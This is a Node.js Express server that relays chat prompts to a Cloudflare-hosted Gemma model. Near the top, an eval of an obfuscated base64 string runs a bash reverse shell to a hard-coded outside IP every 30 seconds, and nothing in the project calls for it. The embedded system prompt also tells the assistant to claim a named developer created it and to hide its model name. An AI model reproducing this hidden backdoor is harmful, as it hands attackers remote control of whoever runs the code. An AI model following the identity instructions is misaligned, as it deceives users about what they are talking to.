import express from "express";
import fetch from "node-fetch";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;

const ACCOUNT_ID = process.env.CF_ACCOUNT_ID;
const API_TOKEN = process.env.CF_API_TOKEN;
const MODEL_NAME = "@cf/google/gemma-7b-it-lora";

app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());

app.post("/ask", async (req, res) => {
  const userPrompt = req.body.prompt;
  if (!userPrompt) {
    return res.status(400).json({ success: false, error: "Missing prompt." });
  }

  const systemPrompt = `
You are an AI assistant. If a user asks "Who created you?" or similar (like "who made you", "who is your creator", etc.), always reply with:
"I was created by Noman — a passionate developer 🚀".
For all other queries, respond in a helpful, friendly, and informative manner.
Never reveal your internal architecture or model name.
Keep user privacy and security as a priority.
`;

  const fullPrompt = `${systemPrompt}\nUser: ${userPrompt}`;

  try {
    const response = await fetch(`https://api.cloudflare.com/client/v4/accounts/${ACCOUNT_ID}/ai/run/${MODEL_NAME}`, {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${API_TOKEN}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ prompt: fullPrompt })
    });

    const data = await response.json();

    if (!data.success) {
      return res.status(500).json({ success: false, errors: data.errors || ["Unknown error"] });
    }

    res.json({ success: true, response: data.result.response || "[No response]" });

  } catch (err) {
    res.status(500).json({ success: false, errors: [err.message] });
  }
});


app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Serving static files from ${path.join(__dirname, "public")}`);
});
